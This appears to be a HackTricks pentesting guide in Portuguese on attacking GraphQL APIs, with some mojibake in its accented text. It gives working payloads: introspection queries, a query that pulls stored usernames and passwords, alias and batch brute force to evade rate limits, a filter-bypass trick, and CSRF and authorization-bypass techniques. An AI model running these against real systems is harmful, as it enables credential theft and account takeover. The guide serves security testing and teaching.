# GraphQL

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Introdu√ß√£o

GraphQL atua como uma alternativa √† API REST. APIs REST exigem que o cliente envie m√∫ltiplas requisi√ß√µes para diferentes endpoints na API para consultar dados do banco de dados backend. Com GraphQL, voc√™ s√≥ precisa enviar uma requisi√ß√£o para consultar o backend. Isso √© muito mais simples porque voc√™ n√£o precisa enviar m√∫ltiplas requisi√ß√µes para a API, uma √∫nica requisi√ß√£o pode ser usada para reunir todas as informa√ß√µes necess√°rias.

## GraphQL

√Ä medida que novas tecnologias surgem, novas vulnerabilidades tamb√©m aparecem. Por **padr√£o**, o GraphQL **n√£o** implementa **autentica√ß√£o**, isso fica a cargo do desenvolvedor implementar. Isso significa que, por padr√£o, o GraphQL permite que qualquer um o consulte, e qualquer informa√ß√£o sens√≠vel estar√° dispon√≠vel para atacantes n√£o autenticados.

Ao realizar seus ataques de for√ßa bruta em diret√≥rios, certifique-se de adicionar os seguintes caminhos para verificar a exist√™ncia de inst√¢ncias GraphQL.

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

<figure><img src="../../.gitbook/assets/image (6) (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Uma vez que voc√™ encontre uma inst√¢ncia aberta de GraphQL, voc√™ precisa saber **quais consultas ela suporta**. Isso pode ser feito usando o sistema de introspec√ß√£o, mais detalhes podem ser encontrados aqui: [**GraphQL: Uma linguagem de consulta para APIs.**\
√â frequentemente √∫til pedir a um esquema GraphQL informa√ß√µes sobre quais consultas ele suporta. GraphQL nos permite fazer isso‚Ä¶](https://graphql.org/learn/introspection/)

### Identifica√ß√£o

A ferramenta [**graphw00f**](https://github.com/dolevf/graphw00f) √© capaz de detectar qual motor GraphQL √© usado em um servidor e, em seguida, imprime algumas informa√ß√µes √∫teis para o auditor de seguran√ßa.

#### Consultas universais <a href="#universal-queries" id="universal-queries"></a>

Se voc√™ enviar `query{__typename}` para qualquer endpoint GraphQL, ele incluir√° a string `{"data": {"__typename": "query"}}` em algum lugar em sua resposta. Isso √© conhecido como uma consulta universal e √© uma ferramenta √∫til para sondar se uma URL corresponde a um servi√ßo GraphQL.

A consulta funciona porque todo endpoint GraphQL tem um campo reservado chamado `__typename` que retorna o tipo do objeto consultado como uma string.

### Enumera√ß√£o B√°sica

GraphQL geralmente suporta **GET**, **POST** (x-www-form-urlencoded) e **POST**(json). Embora, por seguran√ßa, seja recomendado permitir apenas json para prevenir ataques CSRF.

#### Introspec√ß√£o

Para usar a introspec√ß√£o para descobrir informa√ß√µes do esquema, consulte o campo `__schema`. Este campo est√° dispon√≠vel no tipo raiz de todas as consultas.
```bash
query={__schema{types{name,fields{name}}}}
```
```graphql
{
  __schema {
    types {
      name
  }
}
```
{% endcode %}

Com esta consulta, voc√™ encontrar√° o nome de todos os tipos em uso:

![](<../../.gitbook/assets/image (202).png>)
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Com esta consulta, voc√™ pode extrair todos os tipos, seus campos e seus argumentos (e o tipo dos argumentos). Isso ser√° muito √∫til para saber como consultar o banco de dados.

![](<../../.gitbook/assets/image (207) (3).png>)

**Erros**

√â interessante saber se os **erros** ser√£o **exibidos**, pois eles contribuir√£o com informa√ß√µes √∫teis.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (205) (1).png>)

**Enumera√ß√£o do Esquema de Banco de Dados via Introspec√ß√£o**

{% hint style="info" %}
Se a introspec√ß√£o estiver ativada, mas a consulta acima n√£o funcionar, tente remover as diretivas `onOperation`, `onFragment` e `onField` da estrutura da consulta.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Consulta de introspec√ß√£o inline:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
A √∫ltima linha de c√≥digo √© uma consulta graphql que ir√° despejar todas as meta-informa√ß√µes do graphql (nomes de objetos, par√¢metros, tipos...)

![](<../../.gitbook/assets/image (206).png>)

Se a introspec√ß√£o estiver habilitada, voc√™ pode usar o [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) para visualizar em uma GUI todas as op√ß√µes.

### Consultando

Agora que sabemos que tipo de informa√ß√£o est√° salva dentro do banco de dados, vamos tentar **extrair alguns valores**.

Na introspec√ß√£o, voc√™ pode encontrar **qual objeto voc√™ pode consultar diretamente** (porque voc√™ n√£o pode consultar um objeto apenas porque ele existe). Na imagem a seguir, voc√™ pode ver que o "_queryType_" √© chamado "_Query_" e que um dos campos do objeto "_Query_" √© "_flags_", que tamb√©m √© um tipo de objeto. Portanto, voc√™ pode consultar o objeto flag.

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-17-48.png)

Note que o tipo da consulta "_flags_" √© "_Flags_", e este objeto √© definido como abaixo:

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-22-57.png)

Voc√™ pode ver que os objetos "_Flags_" s√£o compostos por **name** e **value**. Ent√£o voc√™ pode obter todos os nomes e valores das flags com a consulta:
```javascript
query={flags{name, value}}
```
Observe que, caso o **objeto a consultar** seja um **tipo primitivo** como **string**, como no exemplo a seguir

![](<../../.gitbook/assets/image (441).png>)

Voc√™ pode simplesmente consult√°-lo com:
```javascript
query={hiddenFlags}
```
Em outro exemplo onde havia 2 objetos dentro do objeto "_Query_": "_user_" e "_users_".\
Se esses objetos n√£o precisarem de nenhum argumento para buscar, poderiam **recuperar todas as informa√ß√µes deles** apenas **solicitando** os dados que voc√™ quer. Neste exemplo da Internet, voc√™ poderia extrair os nomes de usu√°rio e senhas salvos:

![](<../../.gitbook/assets/image (208).png>)

No entanto, neste exemplo, se voc√™ tentar fazer isso, voc√™ recebe este **erro**:

![](<../../.gitbook/assets/image (210).png>)

Parece que de alguma forma ele vai buscar usando o argumento "_**uid**_" do tipo _**Int**_.\
De qualquer forma, j√° sab√≠amos disso, na se√ß√£o [Enumera√ß√£o B√°sica](graphql.md#basic-enumeration) uma consulta foi proposta que estava nos mostrando todas as informa√ß√µes necess√°rias: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Se voc√™ ler a imagem fornecida quando eu executo essa consulta, voc√™ ver√° que "_**user**_" tinha o **arg** "_**uid**_" do tipo _Int_.

Ent√£o, realizando um leve bruteforce em _**uid**_, descobri que em _**uid**=**1**_ um nome de usu√°rio e uma senha foram recuperados:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (211).png>)

Note que eu **descobri** que eu poderia pedir pelos **par√¢metros** "_**user**_" e "_**password**_" porque se eu tentar procurar por algo que n√£o existe (`query={user(uid:1){noExists}}`) eu recebo este erro:

![](<../../.gitbook/assets/image (213).png>)

E durante a **fase de enumera√ß√£o** eu descobri que o objeto "_**dbuser**_" tinha como campos "_**user**_" e "_**password**_".

**Truque de despejo de string de consulta (agradecimentos a @BinaryShadow\_)**

Se voc√™ pode buscar por um tipo de string, como: `query={theusers(description: ""){username,password}}` e voc√™ **procura por uma string vazia** isso ir√° **despejar todos os dados**. (_Note que este exemplo n√£o est√° relacionado com o exemplo dos tutoriais, para este exemplo suponha que voc√™ pode buscar usando "**theusers**" por um campo String chamado "**description**"_).

GraphQL √© uma tecnologia relativamente nova que est√° come√ßando a ganhar alguma tra√ß√£o entre startups e grandes corpora√ß√µes. Al√©m da falta de autentica√ß√£o por padr√£o, endpoints GraphQL podem ser vulner√°veis a outros bugs, como IDOR.

### Pesquisando

Para este exemplo, imagine um banco de dados com **pessoas** identificadas pelo email e pelo nome e **filmes** identificados pelo nome e classifica√ß√£o. Uma **pessoa** pode ser **amiga** de outras **pessoas** e uma pessoa pode **ter filmes**.

Voc√™ pode **pesquisar** pessoas **pelo** **nome** e obter seus emails:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Voc√™ pode **procurar** pessoas **pelo** **nome** e obter os **filmes** aos quais est√£o **inscritas**:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Observe como √© indicado para recuperar o `name` dos `subscribedMovies` da pessoa.

Voc√™ tamb√©m pode **pesquisar v√°rios objetos ao mesmo tempo**. Neste caso, √© feita uma busca de 2 filmes:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Ou at√© mesmo **rela√ß√µes de v√°rios objetos diferentes usando aliases**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutations

**Mutations s√£o usadas para fazer altera√ß√µes no lado do servidor.**

Na **introspec√ß√£o**, voc√™ pode encontrar as **mutations** **declaradas**. Na imagem a seguir, o "_MutationType_" √© chamado de "_Mutation_" e o objeto "_Mutation_" cont√©m os nomes das mutations (como "_addPerson_" neste caso):

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-26-27.png)

Para este exemplo, imagine um banco de dados com **pessoas** identificadas pelo email e nome e **filmes** identificados pelo nome e classifica√ß√£o. Uma **pessoa** pode ser **amiga** de outras **pessoas** e uma pessoa pode **ter filmes**.

Uma mutation para **criar novos** filmes dentro do banco de dados pode ser como a seguinte (neste exemplo, a mutation √© chamada `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Observe como os valores e o tipo de dados s√£o indicados na consulta.**

Tamb√©m pode haver uma **mutation** para **criar** **pessoas** (chamada `addPerson` neste exemplo) com amigos e filmes (note que os amigos e filmes devem existir antes de criar uma pessoa relacionada a eles):
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### For√ßa bruta em lote em 1 requisi√ß√£o API

Esta informa√ß√£o foi retirada de [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Autentica√ß√£o atrav√©s da API GraphQL com **envio simult√¢neo de muitas consultas com credenciais diferentes** para verifica√ß√£o. √â um ataque de for√ßa bruta cl√°ssico, mas agora √© poss√≠vel enviar mais de um par de login/senha por requisi√ß√£o HTTP devido ao recurso de lote do GraphQL. Esta abordagem enganaria aplicativos de monitoramento de taxa externa, fazendo-os pensar que est√° tudo bem e que n√£o h√° um bot tentando adivinhar senhas.

Abaixo, voc√™ pode encontrar a demonstra√ß√£o mais simples de uma solicita√ß√£o de autentica√ß√£o de aplicativo, com **3 pares de email/senha diferentes de cada vez**. Obviamente, √© poss√≠vel enviar milhares em uma √∫nica solicita√ß√£o da mesma maneira:

![](<../../.gitbook/assets/image (182) (1).png>)

Como podemos ver na captura de tela da resposta, as primeiras e terceiras solicita√ß√µes retornaram _null_ e refletiram a informa√ß√£o correspondente na se√ß√£o _error_. A **segunda muta√ß√£o tinha os dados de autentica√ß√£o corretos** e a resposta tem o token de sess√£o de autentica√ß√£o correto.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL Sem Introspec√ß√£o

Cada vez mais **endpoints graphql est√£o desativando a introspec√ß√£o**. No entanto, os erros que o graphql gera quando recebe uma solicita√ß√£o inesperada s√£o suficientes para ferramentas como [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) recriarem a maior parte do esquema.

Al√©m disso, a extens√£o Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **observa as solicita√ß√µes da API GraphQL passando pelo Burp** e **constr√≥i** um esquema GraphQL interno com cada nova consulta que v√™. Tamb√©m pode expor o esquema para GraphiQL e Voyager. A extens√£o retorna uma resposta falsa quando recebe uma consulta de introspec√ß√£o. Como resultado, o GraphQuail mostra todas as consultas, argumentos e campos dispon√≠veis para uso dentro da API. Para mais informa√ß√µes [**verifique isto**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Uma boa **lista de palavras** para descobrir [**entidades GraphQL pode ser encontrada aqui**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Contornando defesas de introspec√ß√£o GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

Se voc√™ n√£o conseguir executar consultas de introspec√ß√£o para a API que est√° testando, tente inserir um **caractere especial ap√≥s a palavra-chave `__schema`**.

Quando os desenvolvedores desativam a introspec√ß√£o, eles podem usar uma regex para excluir a palavra-chave `__schema` nas consultas. Voc√™ deve tentar caracteres como **espa√ßos**, **novas linhas** e **v√≠rgulas**, pois s√£o **ignorados** pelo GraphQL, mas n√£o por regex com falhas.

Assim, se o desenvolvedor excluiu apenas `__schema{`, ent√£o a consulta de introspec√ß√£o abaixo n√£o seria exclu√≠da.
```bash
#Introspection query with newline
{
"query": "query{__schema
{queryType{name}}}"
}
```
Se isso n√£o funcionar, tente executar a sonda usando um m√©todo de solicita√ß√£o alternativo, pois a introspec√ß√£o pode estar desativada apenas para POST. Tente uma solicita√ß√£o GET ou uma solicita√ß√£o POST com um content-type de `x-www-form-urlencoded`.

### Estruturas GraphQL Vazadas

Se a introspec√ß√£o estiver desativada, tente olhar o c√≥digo-fonte do site. As consultas geralmente s√£o pr√©-carregadas no navegador como bibliotecas javascript. Essas consultas pr√©-escritas podem revelar informa√ß√µes valiosas sobre o esquema e o uso de cada objeto e fun√ß√£o. A aba `Sources` das ferramentas de desenvolvedor pode pesquisar todos os arquivos para enumerar onde as consultas est√£o salvas. √Äs vezes, at√© as consultas protegidas pelo administrador j√° est√£o expostas.
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF em GraphQL

Se voc√™ n√£o sabe o que √© CSRF, leia a seguinte p√°gina:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

L√° fora, voc√™ vai poder encontrar v√°rios endpoints GraphQL **configurados sem tokens CSRF.**

Note que as requisi√ß√µes GraphQL s√£o geralmente enviadas via requisi√ß√µes POST usando o Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
No entanto, a maioria dos endpoints GraphQL tamb√©m suporta **`form-urlencoded` POST requests:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Portanto, como as solicita√ß√µes CSRF, como as anteriores, s√£o enviadas **sem solicita√ß√µes de preflight**, √© poss√≠vel **realizar** **altera√ß√µes** no GraphQL abusando de um CSRF.

No entanto, observe que o novo valor padr√£o do cookie para a flag `samesite` do Chrome √© `Lax`. Isso significa que o cookie s√≥ ser√° enviado de um site terceiro em solicita√ß√µes GET.

Note que geralmente √© poss√≠vel enviar a **solicita√ß√£o de consulta** tamb√©m como uma **solicita√ß√£o GET e o token CSRF pode n√£o ser validado em uma solicita√ß√£o GET.**

Al√©m disso, abusar de um **ataque** [**XS-Search**](../../pentesting-web/xs-search.md) pode ser poss√≠vel exfiltrar conte√∫do do endpoint GraphQL abusando das credenciais do usu√°rio.

Para mais informa√ß√µes, **consulte o** [**post original aqui**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Autoriza√ß√£o no GraphQL

Muitas fun√ß√µes do GraphQL definidas no endpoint podem apenas verificar a autentica√ß√£o do solicitante, mas n√£o a autoriza√ß√£o.

Modificar vari√°veis de entrada da consulta pode levar ao vazamento de detalhes sens√≠veis da conta [vazados](https://hackerone.com/reports/792927).

A muta√ß√£o at√© poderia levar √† tomada de controle da conta, tentando modificar outros dados da conta.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Bypass de autoriza√ß√£o no GraphQL

[Encadeamento de consultas](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) pode contornar um sistema de autentica√ß√£o fraco.

No exemplo abaixo, voc√™ pode ver que a opera√ß√£o √© "forgotPassword" e que ela deveria executar apenas a consulta forgotPassword associada a ela. Isso pode ser contornado adicionando uma consulta ao final, neste caso adicionamos "register" e uma vari√°vel de usu√°rio para o sistema registrar como um novo usu√°rio.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Bypass de limite de taxa usando aliases

Normalmente, objetos GraphQL n√£o podem conter m√∫ltiplas propriedades com o mesmo nome. Aliases permitem que voc√™ contorne essa restri√ß√£o **nomeando explicitamente as propriedades que deseja** que a API retorne. Voc√™ pode usar aliases para retornar **m√∫ltiplas inst√¢ncias do mesmo** tipo de objeto em uma √∫nica solicita√ß√£o.

Para mais informa√ß√µes sobre aliases no GraphQL, veja [Aliases](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Embora os aliases sejam destinados a limitar o n√∫mero de chamadas de API que voc√™ precisa fazer, eles tamb√©m podem ser usados para for√ßa bruta em um endpoint GraphQL.

Muitos endpoints ter√£o algum tipo de **limitador de taxa para prevenir ataques de for√ßa bruta**. Alguns limitadores de taxa funcionam com base no **n√∫mero de solicita√ß√µes HTTP** recebidas em vez do n√∫mero de opera√ß√µes realizadas no endpoint. Como aliases efetivamente permitem enviar m√∫ltiplas consultas em uma √∫nica mensagem HTTP, eles podem contornar essa restri√ß√£o.

O exemplo simplificado abaixo mostra uma s√©rie de **consultas com aliases verificando se c√≥digos de desconto de lojas s√£o v√°lidos**. Esta opera√ß√£o poderia potencialmente contornar o limite de taxa, pois √© uma √∫nica solicita√ß√£o HTTP, mesmo que possa ser usada para verificar um grande n√∫mero de c√≥digos de desconto de uma s√≥ vez.
```bash
#Request with aliased queries
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Ferramentas

### Scanners de Vulnerabilidade

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Toolkit que pode ser usado para capturar esquemas e procurar por dados sens√≠veis, testar autoriza√ß√£o, for√ßa bruta em esquemas e encontrar caminhos para um determinado tipo.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Pode ser usado como standalone ou [extens√£o Burp](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Pode ser usado como um cliente CLI tamb√©m para automatizar ataques.
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Ferramenta que lista as diferentes maneiras de alcan√ßar um determinado tipo em um esquema GraphQL.
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Extens√£o Burp para testes avan√ßados em GraphQL. O _**Scanner**_ √© o n√∫cleo do InQL v5.0, onde voc√™ pode analisar um endpoint GraphQL ou um arquivo de esquema de introspec√ß√£o local. Ele gera automaticamente todas as poss√≠veis queries e mutations, organizando-as em uma vis√£o estruturada para sua an√°lise. O componente _**Attacker**_ permite executar ataques GraphQL em lote, o que pode ser √∫til para contornar limites de taxa mal implementados.

### Clientes

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): Cliente GUI
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): Cliente GUI

### Testes Autom√°ticos

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* V√≠deo explicando AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Refer√™ncias

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>Aprenda AWS hacking do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>
